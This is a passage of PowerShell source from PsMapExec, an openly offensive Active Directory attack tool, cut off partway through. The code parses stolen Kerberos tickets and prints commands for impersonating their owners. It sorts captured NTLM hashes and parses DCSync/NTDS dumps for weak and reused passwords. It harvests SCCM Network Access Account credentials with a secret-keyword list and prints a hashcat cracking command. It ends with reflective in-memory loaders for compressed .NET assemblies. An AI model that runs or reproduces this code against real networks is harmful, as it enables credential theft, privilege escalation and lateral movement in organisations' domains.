                if ($DomainUserName -in $EnterpriseAdmins) { 
                    $notes += "[Enterprise Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $ServerOperators) { 
                    $notes += "[Server Operator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $AccountOperators) { 
                    $notes += "[Account Operator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $HyperVAdministrators) { 
                    $notes += "[Hyper-V Administrator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $StorageReplicateAdministrators) { 
                    $notes += "[Storage Replicate Administrator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $SchemaAdmins) { 
                    $notes += "[Schema Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $KeyAdmins) { 
                    $notes += "[Key Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $EnterpriseKeyAdmins) { 
                    $notes += "[Enterprise Key Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $DnsAdmins) { 
                    $notes += "[Dns Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $DHCPAdministrators) { 
                    $notes += "[DHCP Administrator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $GroupPolicyCreatorOwners) { 
                    $notes += "[Group Policy Creator Owner] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $BackupOperators) { 
                    $notes += "[Backup Operator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $CertPublishers) { 
                    $notes += "[Cert Publisher] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $PrintOperators) { 
                    $notes += "[Print Operator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $OrganizationManagement) { 
                    $notes += "[Organization Management] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $ServerManagement) { 
                    $notes += "[Server Management] " 
                    $PrivilegedUser = $true
                }


                # Check AdminCount only if the user is not already identified as $PrivilegedUser
                if (-not $PrivilegedUser -and (AdminCount -UserName $DomainUserName -Searcher $Searcher)) {
                    $notes += "[AdminCount=1] "
                }

                # if a KRBTGT service is contained within the field, add the tag [TGT] to the results
                if ($data.ServiceName -match "krbtgt/") {
                    $notes += "[TGT] "
                }

                # Only present results if the note field has been populated. This means interesting results have been identified.
                if ($notes -ne "") {
                    if ($DisplayComputerName) {
                        Write-Host "`n`n-[$Computer]-`n"
                        $DisplayComputerName = $false
                    }
                    
                    Write-Host "User Name     : $($domainName.ToLower())\$($DomainUserName)"
                    Write-Host "Service Name  : $($data.ServiceName.ToLower())"
                    if ($data.ServiceName -match "krbtgt/") {} Else { Write-Host "Server Name   : $($data.ServerName.ToLower())" }
                    Write-Host "Ticket Expiry : $($data.TicketExp)"
                    Write-Host -NoNewline "Notes         : "
                    Write-Host -ForegroundColor "Yellow" -NoNewline "$notes"
                    Write-Host

                    # Logic to help pull just the ticket string
                    $ticketPattern = "-\[Ticket\]-`r?`n`r?`n(.+?)(?:`r?`n|$)"
                    $ticketStartPos = $match.Index + $match.Length
                    $ticketSearchText = $fileContent.Substring($ticketStartPos)
                    if ($ticketSearchText -match $ticketPattern) {
                        $ticketString = $Matches[1]
                        
                        # Replace '\' with '_' in ServiceName, Windows will not accept "/" as part of a file name
                        $data.ServiceName = $data.ServiceName.Replace('/', '@')
                        
                        # Form a path and file name made up of the ticket properties
                        $filePath = "$ComputerDirectory\$($data.UserName)-$($data.ServiceName).txt"
                        $ticketString | Out-File -FilePath $filePath -NoNewline -Encoding "ASCII"
                        
                        # Assign a random variable name to each ticket path to help produce tidy output to console for command generation
                        if ($notes -match "TGT") {
                            do {
                                $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 16 | % { [char]$_ })
                            } while (Get-Variable -Name $randomVarName -ErrorAction SilentlyContinue -Scope Global)

                            Set-Variable -Name $randomVarName -Value $filePath -Scope Global
                        
                            # A neat one-liner instruction for the user
                            Write-Host "Impersonate   : PsMapExec -Targets $Targets -Method $Method -Ticket `$$randomVarName"
                            Write-Host
                        
                        }
                        Else { Write-Host }
                    }
                }
            }

            # Move and rename the file after processing
            $newFileName = ".$Computer.FullDump.txt"
            Move-Item -Path $_.FullName -Destination "$ComputerDirectory\$newFileName" -Force
        }

        Write-Host "`n`n[*] " -NoNewline -ForegroundColor "Yellow"
        Write-Host "Only interesting results have  been shown. Computer accounts are omitted"
        Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
        Write-Host "Run with -NoParse to prevent parsing results in the future"
        Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
        Write-Host "Each ticket has been stored in $Tickets"
    }

    function Parse-TGTDeleg {
        $AvailableMethods = "WMI", "WinRM", "SMB", "MSSQL", "SessionHunter"
        if ($Method -notin $AvailableMethods) { 
            Write-Host "Method $Method is not in the available methods: $AvailableMethods" -ForegroundColor "Red"
            return 
        }

        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
        Start-Sleep -Seconds 2

        Write-Output ""

        if (-not (Test-Path $TGTDeleg)) {
            Write-Error "Directory $TGTDeleg does not exist."
            return
        }

        # Initialize DirectorySearcher
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domain")

        Get-ChildItem -Path $TGTDeleg -Filter "*.txt" | ForEach-Object {
            $fileContent = Get-Content -Path $_.FullName -Raw
            $Computer = $_.BaseName -split '-TGT' | Select-Object -First 1
            Write-Output ""
            Write-Output "-[$Computer]-"
            Write-Output ""

            # Define regex pattern to match Base64 encoded Kerberos ticket data
            $pattern = "doI[A-Za-z0-9+/=]+"

            # Match and extract details
            $matches = [regex]::Matches($fileContent, $pattern)
            foreach ($match in $matches) {
                $ticketData = $match.Value.Trim()

                # Generate a random variable name
                do {
                    $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 16 | % { [char]$_ })
                } while (Get-Variable -Name $randomVarName -ErrorAction SilentlyContinue)

                # Set the variable to hold the ticket data in the global scope
                Set-Variable -Name $randomVarName -Value $ticketData -Scope Global

                # Verify the variable contains the ticket data
                $assignedValue = Get-Variable -Name $randomVarName -ValueOnly -Scope Global

                # Get ticket details
                $TicketDetails = Invoke-rTickets explain /ticket:$ticketData | Out-string

                # Parse the ticket details to get user and domain information
                $userName = ($TicketDetails | Select-String -Pattern 'UserName\s*:\s*(\S+)').Matches[0].Groups[1].Value
                $userDomain = ($TicketDetails | Select-String -Pattern 'UserDomain\s*:\s*(\S+)').Matches[0].Groups[1].Value
                $nameService = ($TicketDetails | Select-String -Pattern 'NameService\s*:\s*(\S+)').Matches[0].Groups[1].Value
                $ticketExpiry = ($TicketDetails | Select-String -Pattern 'End\s*:\s*(\d{2}/\d{2}/\d{4}\s+\d{2}:\d{2}:\d{2})').Matches[0].Groups[1].Value


                # Initialize notes variable
                $notes = ""

                # Check if the user is a member of any privileged groups
                $DomainUserName = "$userDomain\$userName"

                # Check AdminCount
                if (AdminCount -UserName $userName -Searcher $Searcher) {
                    $notes += "[AdminCount=1] "
                }

                # Check membership in privileged groups
                if ($userName -in $DomainAdmins) {
                    $notes += "[Domain Admin] "
                }
                if ($userName -in $EnterpriseAdmins) {
                    $notes += "[Enterprise Admin] "
                }
                if ($userName -in $ServerOperators) {
                    $notes += "[Server Operator] "
                }
                if ($userName -in $AccountOperators) {
                    $notes += "[Account Operator] "
                }
                if ($userName -in $HyperVAdministrators) {
                    $notes += "[Hyper-V Administrator] "
                }
                if ($userName -in $StorageReplicateAdministrators) {
                    $notes += "[Storage Replicate Administrator] "
                }
                if ($userName -in $SchemaAdmins) {
                    $notes += "[Schema Admin] "
                }
                if ($userName -in $KeyAdmins) {
                    $notes += "[Key Admin] "
                }
                if ($userName -in $EnterpriseKeyAdmins) {
                    $notes += "[Enterprise Key Admin] "
                }
                if ($userName -in $DnsAdmins) {
                    $notes += "[Dns Admin] "
                }
                if ($userName -in $DHCPAdministrators) {
                    $notes += "[DHCP Administrator] "
                }
                if ($userName -in $GroupPolicyCreatorOwners) {
                    $notes += "[Group Policy Creator Owner] "
                }
                if ($userName -in $BackupOperators) {
                    $notes += "[Backup Operator] "
                }
                if ($userName -in $CertPublishers) {
                    $notes += "[Cert Publisher] "
                }
                if ($userName -in $PrintOperators) {
                    $notes += "[Print Operator] "
                }
                if ($userName -in $OrganizationManagement) {
                    $notes += "[Organization Management] "
                }
                if ($userName -in $ServerManagement) {
                    $notes += "[Server Management] "
                }



                # Output the ticket details
                Write-Host "  User Name     : $DomainUserName"
                Write-Host "  Service Name  : $nameService"
                Write-Host "  Ticket Expiry : $ticketExpiry"

                # Output the notes
                if ($notes -ne "") {
                    Write-Host "  Notes         : " -NoNewline
                    Write-Host "$notes" -ForegroundColor "Yellow"
                }

                # Output the command for impersonation
                Write-Host "  Impersonate   : PsMapExec -Targets $Targets -Method WMI -Ticket `$$randomVarName"
                Write-Output ""

                # Move the processed file into a folder named after $Computer and save each ticket data
                $ComputerDirectory = "$TGTDeleg\$Computer"
                if (-not (Test-Path $ComputerDirectory)) {
                    New-Item -ItemType Directory -Path $ComputerDirectory -Force | Out-Null
                }
            
                # Create a filename based on user and ticket type
                $ticketFileName = "$ComputerDirectory\$userName-TGT.txt"
                $ticketData | Out-File -FilePath $ticketFileName -Encoding ASCII
            }

            # Move the original file to the computer directory after processing
            Move-Item -Path $_.FullName -Destination "$ComputerDirectory\.$Computer-All-Output.txt" -Force
        }
    }

    ################################################################################################################
    ######################################### Function: Parse-NTLM #################################################
    ################################################################################################################

    function Parse-NTLM {
        $AvailableMethods = "WMI", "WinRM", "SMB", "MSSQL", "SessionHunter"
        
        if ($Method -notin $AvailableMethods) { return }
        if ($Global:SuccessCount -eq 0) { return }
        
        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
        Start-Sleep -Seconds 2

        if (-not (Test-Path $NTLM)) {
            Write-Error "Directory $NTLM does not exist."
            return
        }

        $uniqueNTLMv1 = @{}
        $uniqueNTLMv2 = @{}

        Get-ChildItem -Path $NTLM -Filter "*.txt" | Where-Object { $_.Name -ne ".All-NTLMv2.txt" -and $_.Name -ne ".All-NTLMv1.txt" } | ForEach-Object {
            $fileContent = Get-Content -Path $_.FullName -Raw
            $Computer = $_.BaseName

            Write-Output "`n-[$Computer]-`n"

            $ComputerDirectory = "$NTLM\$Computer"
            if (-not (Test-Path $ComputerDirectory)) {
                New-Item -ItemType Directory -Path $ComputerDirectory -Force | Out-Null
            
            }

            Move-Item -Path $_.FullName -Destination $ComputerDirectory -Force

            $AllNTLMFile = "$ComputerDirectory\$Computer-All-NTLM.txt"
            $fileContent | Out-File -FilePath $AllNTLMFile -Encoding ASCII

            $fileContent -split "\r?\n" | ForEach-Object {
                if ($_ -match '^(.*?)::(\w+):(\w+):(\w+):(\w+)$') {
                    $userName, $domain, $ntlmHash, $response, $endString = $matches[1..5]
                    $UserNTLMFile = "$ComputerDirectory\$userName-NTLM.txt"
                    $_ | Out-File -FilePath $UserNTLMFile -Append -Encoding ASCII

                    if ($endString -eq "1122334455667788") {
                        Write-Host "Obtained NTLMv1 hash for $userName"
                        if (-not $uniqueNTLMv1.ContainsKey($_)) {
                            $uniqueNTLMv1[$_] = $true
                        }
                    }
                    else {
                        Write-Host "Obtained NTLMv2 hash for $userName"
                        if (-not $uniqueNTLMv2.ContainsKey($_)) {
                            $uniqueNTLMv2[$_] = $true
                        }
                    }
                }
            }
        }

        Write-Output ""
        Write-Output ""



        if ($uniqueNTLMv2.Count -gt 0) {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Outputting all NTLMv2 results to $NTLM\All-NTLMv2.txt"
            $uniqueNTLMv2.GetEnumerator() | ForEach-Object {
                $_.Key | Out-File -FilePath "$NTLM\.All-NTLMv2.txt" -Append -Encoding ASCII
            }
        }
        else {
            Write-Host "No unique NTLMv2 hashes found"
        }

        if ($uniqueNTLMv1.Count -gt 0) {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Outputting all NTLMv1 results to $NTLM\All-NTLMv1.txt"
            $uniqueNTLMv1.GetEnumerator() | ForEach-Object {
                $_.Key | Out-File -FilePath "$NTLM\.All-NTLMv1.txt" -Append -Encoding ASCII
            }
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "You can check to see if the NTLMv1 password is known against https://shuck.sh/get-shucking.php"
        } 
    }


    ################################################################################################################
    ############################################## Function: Parse-NTDS ############################################
    ################################################################################################################

    function Invoke-NTDSParse {
        param (
            [string]$File,
            [array]$EnabledDomainUsers
        )

        $NTDSContent = Get-Content -Path $File

        $userHashes = @()
        $computerHashes = @()
        $identicalPasswordGroups = @{}
        $enabledIdenticalPasswordGroups = @{}
        $enabledUserHashes = @()
        $emptyPasswordUsers = @()
        $enabledEmptyPasswordUsers = @()
        $UsersWithAccountNameAsPassword = @()
        $EnabledUsersWithAccountNameAsPassword = @()

        foreach ($line in $NTDSContent) {
            $parts = $line -split ':'
            $user = $parts[0]
            $hash = $parts[3]

            if ($hash -eq '31d6cfe0d16ae931b73c59d7e0c089c0') {
                $emptyPasswordUsers += $user
                if ($EnabledDomainUsers -contains $user) {
                    $enabledEmptyPasswordUsers += $user
                }
            }

            try {
                $NTValue = ConvertTo-NT -String $user
                if ($NTValue -eq $hash) {
                    $UsersWithAccountNameAsPassword += $user
                    if ($EnabledDomainUsers -contains $user) {
                        $EnabledUsersWithAccountNameAsPassword += $user
                
                    }
                }
            }
            Catch {}

            if ($user -like "*$*") {
                $computerHashes += $line
            }
            else {
                $userHashes += $line
                if ($hash -ne $null) {
                    if (-not $identicalPasswordGroups.ContainsKey($hash)) {
                        $identicalPasswordGroups[$hash] = @()
                    }
                    $identicalPasswordGroups[$hash] += $user

                    # Check if user is enabled and add to enabled identical password groups
                    if ($EnabledDomainUsers -contains $user) {
                        if (-not $enabledIdenticalPasswordGroups.ContainsKey($hash)) {
                            $enabledIdenticalPasswordGroups[$hash] = @()
                        }
                        $enabledIdenticalPasswordGroups[$hash] += $user
                    }
                }

                if ($EnabledDomainUsers -contains $user) {
                    $enabledUserHashes += $line
                }
            }
        }

        return @{
            userHashes                            = $userHashes
            enabledUserHashes                     = $enabledUserHashes
            computerHashes                        = $computerHashes
            emptyPasswordUsers                    = $emptyPasswordUsers
            enabledEmptyPasswordUsers             = $enabledEmptyPasswordUsers
            identicalPasswordGroups               = $identicalPasswordGroups
            enabledIdenticalPasswordGroups        = $enabledIdenticalPasswordGroups  # Return enabled identical password groups
            UsersWithAccountNameAsPassword        = $UsersWithAccountNameAsPassword
            EnabledUsersWithAccountNameAsPassword = $EnabledUsersWithAccountNameAsPassword
        }
    }

    function Parse-NTDS {
        param([string] $NTDSDirectory)

        $AvailableMethods = "WMI", "WinRM", "SMB", "DCSync"
        if ($Method -notin $AvailableMethods) { return }


        if ($Global:SuccessCount -eq 0) { return }

        Write-Host "`nParsing Results" -ForegroundColor "Yellow"
        Start-Sleep -Seconds 2
    
        $NTDS_Files = Get-ChildItem -Path $NTDSDirectory | Where-Object { $_.Name -Like "*.txt" } | Select-Object -ExpandProperty "FullName"

        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domain")
        $Searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
        $Searcher.PropertiesToLoad.AddRange(@("samAccountName"))
        $searcher.PageSize = 1000
        $users = $Searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
        $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }

        foreach ($NTDS_File in $NTDS_Files) {
            [string]$Date = @()
            $Date += (Get-date).TimeOfDay.Hours
            $Date += (Get-date).TimeOfDay.Minutes
            $Date += (Get-date).TimeOfDay.Seconds

            $results = Invoke-NTDSParse -File $NTDS_File -EnabledDomainUsers $EnabledDomainUsers
            $fileBaseName = [IO.Path]::GetFileNameWithoutExtension($NTDS_File)
            $outputDirectory = Join-Path $NTDSDirectory "${fileBaseName}_Parsed_${Date}"
            $UserData = Join-Path $outputDirectory "User Data"
            $ComputerData = Join-Path $outputDirectory "Computer Data"
            $FullDump = Join-Path $outputDirectory "Full NTDS Dump"

            if (-not (Test-Path -Path $outputDirectory)) {
                New-Item -Path $outputDirectory -ItemType Directory | Out-Null
            }

            if (-not (Test-Path -Path $UserData)) {
                New-Item -Path $UserData -ItemType Directory | Out-Null
            }

            if (-not (Test-Path -Path $ComputerData)) {
                New-Item -Path $ComputerData -ItemType Directory | Out-Null
            }

            if (-not (Test-Path -Path $FullDump)) {
                New-Item -Path $FullDump -ItemType Directory | Out-Null
            }

            $results.userHashes | Set-Content -Path (Join-Path $UserData  "1.All-User-Hashes.txt")
            $results.enabledUserHashes | Set-Content -Path (Join-Path $UserData  "1.Enabled-User-Hashes.txt")
            $results.computerHashes | Set-Content -Path (Join-Path $ComputerData "Computer-Hashes.txt") 
            $results.enabledEmptyPasswordUsers | Set-Content -Path (Join-Path $UserData "2.Enabled-Users-With-Empty-Passwords.txt")
            $results.emptyPasswordUsers | Set-Content -Path (Join-Path $UserData "2.All-Users-With-Empty-Passwords.txt")
            $results.UsersWithAccountNameAsPassword | Set-Content -Path (Join-Path $UserData "3.All-Users-With-Password-As-Account-Name.txt")
            $results.EnabledUsersWithAccountNameAsPassword | Set-Content -Path (Join-Path $UserData "3.Enabled-Users-With-Password-As-Account-Name.txt")

            # Output for grouped users with identical passwords who are enabled
            $groupNumber = 1
            $groupedUsersContent = foreach ($group in $results.enabledIdenticalPasswordGroups.GetEnumerator()) {
                if ($group.Value.Count -gt 1) {
                    Write-Output ""
                    $groupContent = "[Group $groupNumber]`n{0}" -f ($group.Value -join "`n")
                    $groupNumber++
                    $groupContent
                }
            }

            $groupedUsersContent | Set-Content -Path (Join-Path $UserData "4.Enabled-Users-With-Identical-Passwords.txt")
            Move-Item $NTDS_File -Destination "$FullDump" -Force
        }

        if ($Rainbow) {
            RainbowCheck -Module "NTDS" -RCFilePath "$UserData\1.Enabled-User-Hashes.txt"
        }

        Write-Output ""
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Parsed NTDS files stored in $NTDSDirectory"
    }

    ################################################################################################################
    ############################################## Function: Parse-SCCM ############################################
    ################################################################################################################

function Parse-SCCM {

    if ($Global:SuccessCount -eq 0) { return }

    Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
    Start-Sleep -Seconds 2

    Get-ChildItem -Path $SCCM -Filter '*-SCCM.txt' | ForEach-Object {
        $DirectoryName = $_.Name -replace "-SCCM.txt$"
        $DirectoryPath = Join-Path -Path $SCCM -ChildPath $DirectoryName
        New-Item -ItemType 'Directory' -Name $DirectoryName -Path $SCCM -Force | Out-Null

        $newFilePath = Join-Path -Path $DirectoryPath -ChildPath $_.Name
        Move-Item -Path $_.FullName -Destination $newFilePath -Force
        Process-File -FilePath $newFilePath -DirectoryPath $DirectoryPath -ComputerName $DirectoryName
            
    }
}

function Process-File {
    param (
        [string]$FilePath,
        [string]$DirectoryPath,
        [string]$ComputerName
    )

    [string]$DataOutput = Get-Content -Path $FilePath

    $TaskSequences = @()
    $UniqueSequences = @{}
    $UniqueCredentials = @{}
    $InterestingFiles = @()

    $TaskSequences += Select-String -InputObject $DataOutput -Pattern "<sequence version=.*?</sequence>" -AllMatches
    $counter = 0

    # Process each sequence, save only if unique
    foreach ($Match in $TaskSequences.Matches) {
        $sequenceHash = [System.BitConverter]::ToString([System.Security.Cryptography.HashAlgorithm]::Create("MD5").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Match.Value)))

        if (-not $UniqueSequences.ContainsKey($sequenceHash)) {
            $UniqueSequences[$sequenceHash] = $true
            $sequenceXml = [xml]$Match.Value
            $filename = Join-Path -Path $DirectoryPath -ChildPath "TaskSequence_$counter.xml"
            $sequenceXml.Save($filename)
            $counter++

            # Check for specific keywords
                
            $keywords = @(
                
                # SCCM / OSD-specific
                'OSDLocalAdminPassword',
                'OSDDomainName',
                'OSDJoinPassword',
                'OSDJoinAccount',
                'OSDRegisteredUserName',
                'OSDRegisteredOrgName',

                # Core Windows cmds
                'net user',
                'net use', # often used with /user:domain\user password
                'net localgroup',

                # PowerShell-centric
                'convertto-securestring',
                'Get-Credential',
                'New-Object System.Management.Automation.PSCredential',
                'SecureString',

                # Generic password hints
                'password',
                'pwd',
                'pass',

                # Credential objects / switches
                'credential',
                'creds',
                '-user',
                '-username',
                '/u:',
                '-pwd',
                '-pass',
                '/p:',

                # API-style secrets
                'apikey',
                'api key',
                'accesskey',
                'secretkey',
                'secret',
                'authtoken',
                'token',
                'clientsecret',
                'clientid',
                'subscriptionkey',

                # DB / connection strings
                'connectionstring',
                'databasepassword',

                # Cloud / storage
                'storageaccountkey',
                'cosmoskey',
                'keyvault',
                'certthumbprint'
            )

            foreach ($keyword in $keywords) {
                if ($sequenceXml.InnerXml -match $keyword) {
                    $InterestingFiles += $filename | Split-Path -Leaf
                    break
                }
            }
        }
    }

    if ($counter -gt 0) {
        Write-Host ""
        Write-Host ""
        Write-Host "-[$ComputerName]-"
        Write-Host ""
 
        Write-Host "Task Sequences"
        Write-Host "Directory Path  : $DirectoryPath"
        Write-Host "Task Sequences  : Found $($counter) Task Sequences and saved to XML"

        if ($InterestingFiles.Count -gt 0) {
            Write-Host "Possible Creds  : " -NoNewline
            Write-Host "$($InterestingFiles -join ', ')" -NoNewline -ForegroundColor "Yellow"
            Write-Host " <--- check for creds!"
        }
    }

    Write-Host ""

    $NAACredentials = @()
    $NAACredentials += Select-String -InputObject $DataOutput -Pattern "Network Access Username:\s*(.+?)\s*Network Access Password:\s*(\S+)" -AllMatches

    foreach ($cred in $NAACredentials.Matches) {
        $NAAUsername = ($cred.Groups[1].Value -replace '[\x00-\x1F\x7F]', '').Trim()
        $NAAPassword = ($cred.Groups[2].Value -replace '[\x00-\x1F\x7F]', '').Trim()
        $Credential = "$NAAUsername`:$NAAPassword"

        # Extract domain and username for BH Query
        $Split = $NAAUsername -split '\\'
        $NAADomain = $Split[0]
        $NAAUser = $Split[1]
        Append-BHQuery -UserName $NAAUser -Domain $NAADomain -UserOwned -Password $NAAPassword -PasswordProperty

        if (-not $UniqueCredentials.ContainsKey($Credential)) {
            $UniqueCredentials[$Credential] = $true
        }
    }

    if ($UniqueCredentials.Count -gt 0) {
        if ($counter -lt 1) {
            Write-Host ""
            Write-Host "-[$ComputerName]-"
            Write-Host ""
        }

        $outputFile = Join-Path -Path $DirectoryPath -ChildPath "NAA-Credentials.txt"

        Write-Host "Network Access Accounts"
        Write-Host "NAA File Path   : $outputFile"

        foreach ($Credential in $UniqueCredentials.Keys) {
            Write-Host "NAA Credentials :" -NoNewline
            Write-Host " $Credential" -ForegroundColor "Yellow"
        }

        $UniqueCredentials.Keys | Out-File -FilePath $outputFile
    }
}

    ################################################################################################################
    ################################################## Function: MDF ###############################################
    ################################################################################################################

    Function Parse-MDF {

        if ($Global:SuccessCount -eq 0) { return }
        
        Write-Host "`n`nCrack with Hashcat" -ForegroundColor "Yellow"
        Write-Output "hashcat.exe -m 1731 -a 0 -O 0x020050B40C7843AC5C196F9375549D3... Wordlists\rockyou.txt -r rules\best64.rule"

    }


    ################################################################################################################
    ################################################ Execute defined functions #####################################
    ################################################################################################################

    switch ($Method) {
        "All" { Method-All }
        "WinRM" { Method-WinRM }
        "MSSQL" { Method-MSSQL }
        "SMB" { Method-SMB }
        "WMI" { Method-WMI }
        "RDP" { Method-RDP }
        "GenRelayList" { GenRelayList }
        "SessionHunter" { Method-SessionHunter }
        "Spray" { Method-Spray }
        "VNC" { Method-VNC }
        "Kerberoast" { Method-Kroast }
        "Inject" {}
        "IPMI" { Method-IPMI }
        "DCSync" { Method-DCSync }
        "LDAP" { Method-LDAP }
        "LDAPS" { Method-LDAP }
        
    }

    if (!$NoParse) { if ($Module -eq "SAM") { Parse-SAM } }
    if (!$NoParse) { if ($Module -eq "eKeys") { Parse-eKeys } }
    if (!$NoParse) { if ($Module -eq "LogonPasswords") { Parse-LogonPasswords } }
    if (!$NoParse) { if ($Module -eq "KerbDump") { Parse-KerbDump } }
    if (!$NoParse) { if ($Module -eq "NTDS") { Parse-NTDS -NTDSDirectory $DCSyncFullDump } }
    if (!$NoParse) { if ($Module -eq "SCCM") { Parse-SCCM } }
    if (!$NoParse) { if ($Module -eq "TGTDeleg") { Parse-TGTDeleg } }
    if (!$NoParse) { if ($Module -eq "NTLM") { Parse-NTLM } }
    if (!$NoParse) { if ($Module -eq "MDF") { Parse-MDF } }
    if (!$NoParse) { if ($Method -eq "DCSync" -and $Option -notlike "*dcsync:*") { Parse-NTDS -NTDSDirectory $DCSyncFullDump } }
    
    RestoreTicket
    
    if ($Global:SuccessCount -gt 0 ) {
        Write-host "`n`Success Count    : " -NoNewline
        Write-Host "$SuccessCount" -ForegroundColor "Green"

    }

    else {

        Write-host "`n`Success Count    : " -NoNewline
        Write-Host "$SuccessCount"

    }

    if ($Global:AccessDeniedCount -gt 0 ) {
        
        Write-host "Access Denied    : " -NoNewline 
        Write-Host "$AccessDeniedCount" -ForegroundColor "Yellow"

    }


    $Time = (Get-Date).ToString("HH:mm:ss")
    Write-Host "Script Completed : $Time"
    $elapsedTime = (Get-Date) - $startTime
    Write-Host "Elapsed Time     : $elapsedTime"
    
    try { $searcher.Dispose() } Catch {}
    $CurrentUser = $null

    Write-Output ""

    if ($Method -eq "Spray") {
    
        Add-Type -AssemblyName System.Windows.Forms
        $global:balloon = New-Object System.Windows.Forms.NotifyIcon

        $path = (Get-Process -Id $pid).Path
        $balloon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)

        $balloon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info
        $balloon.BalloonTipText = "Spraying complete `nSuccess Count: $SuccessCount"
        $balloon.BalloonTipTitle = "PsMapExec"

        $balloon.Visible = $true
        $balloon.ShowBalloonTip(30000)

        Start-Sleep -Seconds 5

        $balloon.Dispose()


    }

}

################################################################################################################
########################################## End of main function ################################################
################################################################################################################

$Global:Encrypt = {
    function Invoke-AES([string]$k, [string]$iv, [string]$t) {
        $a = New-Object Security.Cryptography.AesCryptoServiceProvider
        $a.KeySize = 256
        $a.BlockSize = 128
        $a.Mode = 'CBC'
        $a.Padding = 'PKCS7'

        # Ensure the key and IV are the correct size
        $keyBytes = [Text.Encoding]::UTF8.GetBytes($k)
        $ivBytes = [Text.Encoding]::UTF8.GetBytes($iv)
        $a.Key = if ($keyBytes.Length -eq 32) { $keyBytes } else { $keyBytes[0..31] }
        $a.IV = if ($ivBytes.Length -eq 16) { $ivBytes } else { $ivBytes[0..15] }

        $encryptor = $a.CreateEncryptor($a.Key, $a.IV)
        $plainTextBytes = [Text.Encoding]::UTF8.GetBytes($t)
        $encryptedBytes = $encryptor.TransformFinalBlock($plainTextBytes, 0, $plainTextBytes.Length)
        $a.Dispose()

        return [Convert]::ToBase64String($encryptedBytes)
    }
}

$Global:Decrypt = {
    function Invoke-Decrypt([string]$k, [string]$iv, [string]$encryptedText) {
        $a = New-Object Security.Cryptography.AesCryptoServiceProvider
        $a.KeySize = 256 
        $a.BlockSize = 128
        $a.Mode = 'CBC'
        $a.Padding = 'PKCS7'

        $keyBytes = [Text.Encoding]::UTF8.GetBytes($k)
        $ivBytes = [Text.Encoding]::UTF8.GetBytes($iv)
        $a.Key = if ($keyBytes.Length -eq 32) { $keyBytes } else { $keyBytes[0..31] }
        $a.IV = if ($ivBytes.Length -eq 16) { $ivBytes } else { $ivBytes[0..15] }

        $encryptedBytes = [Convert]::FromBase64String($encryptedText)
        $decryptor = $a.CreateDecryptor($a.Key, $a.IV)
        $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
        $a.Dispose()

        return [Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)
    }
}


$Global:rbs = @'
function Invoke-rTickets
{
    $a=New-Object IO.MemoryStream(,[Convert]::frOMbaSe64StrInG(""))
    $gzipStream = New-Object IO.Compression.GzipStream($a, [IO.Compression.CompressionMode]::Decompress)
    $memStream = New-Object System.IO.MemoryStream
    $gzipStream.CopyTo($memStream)
    $reflectedAssembly = [System.Reflection.Assembly]::Load($memStream.ToArray())
    $currentConsoleOutput = [Console]::Out
    $textWriter = New-Object IO.StringWriter
    [Console]::SetOut($textWriter)
    [Intranex.Program]::Main([string[]]$args)
    [Console]::SetOut($currentConsoleOutput)
    $textWriter.ToString()
  
}
'@

$Global:irdp = @'
function Invoke-RDP{
    Param ([String]$pRDP = " ")
    
    $memoryStreamInput = New-Object IO.MemoryStream(, [Convert]::FromBase64String(""))
    $gzipStream = New-Object IO.Compression.GzipStream($memoryStreamInput, [IO.Compression.CompressionMode]::Decompress)
    $memoryStreamOutput = New-Object System.IO.MemoryStream
    $gzipStream.CopyTo($memoryStreamOutput)
    [byte[]] $decompressedBytes = $memoryStreamOutput.ToArray()
    $loadedAssembly = [System.Reflection.Assembly]::Load($decompressedBytes)
    $originalOutput = [Console]::Out
    $stringWriter = New-Object IO.StringWriter
    [Console]::SetOut($stringWriter)
    $programArgs = [System.Text.RegularExpressions.Regex]::Split($pRDP, "\s+")
    [pRDP.Program]::Main($programArgs)
    [Console]::SetOut($originalOutput)
    $capturedOutput = $stringWriter.ToString()
    $capturedOutput

}
'@

$Global:rst = @'
function Invoke-Kroast
{
    $kr=New-Object IO.MemoryStream(,[Convert]::frOMbaSe64StrInG(""))
